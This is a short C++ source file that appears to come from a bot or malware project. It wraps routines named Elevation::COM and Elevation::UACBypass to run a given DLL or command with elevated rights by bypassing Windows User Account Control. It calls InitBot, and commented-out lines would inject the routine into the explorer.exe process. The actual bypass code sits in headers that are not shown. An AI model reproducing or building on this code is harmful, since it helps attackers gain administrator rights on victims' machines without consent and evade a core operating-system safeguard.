#include "core\core.h"
#include "core\elevation.h"
#include "core\injects.h"

char dllPath[MAX_PATH];
char cmdPath[MAX_PATH];

static void InitPath( bool dll, const char* path )
{
	dllPath[0] = 0;
	cmdPath[0] = 0;
	if( dll )
		Str::Copy( dllPath, sizeof(dllPath), path );
	else
		Str::Copy( cmdPath, sizeof(cmdPath), path );
}

DWORD WINAPI UACProcess( void* )
{
	InitBot();
	Elevation::COM( dllPath, cmdPath );
	return 0;
}

bool UAC_aq( bool dll, const char* path )
{
	InitPath( dll, path );
	UACProcess(0);
//	DWORD pid = Process::GetExplorerPID();
//	if( pid )
//	{
//		return InjectIntoProcess2( pid, UACProcess );
//	}
	return false;
}

bool UAC_cb( bool dll, const char* path )
{
	InitPath( dll, path );
	return Elevation::UACBypass( dllPath, cmdPath );
}
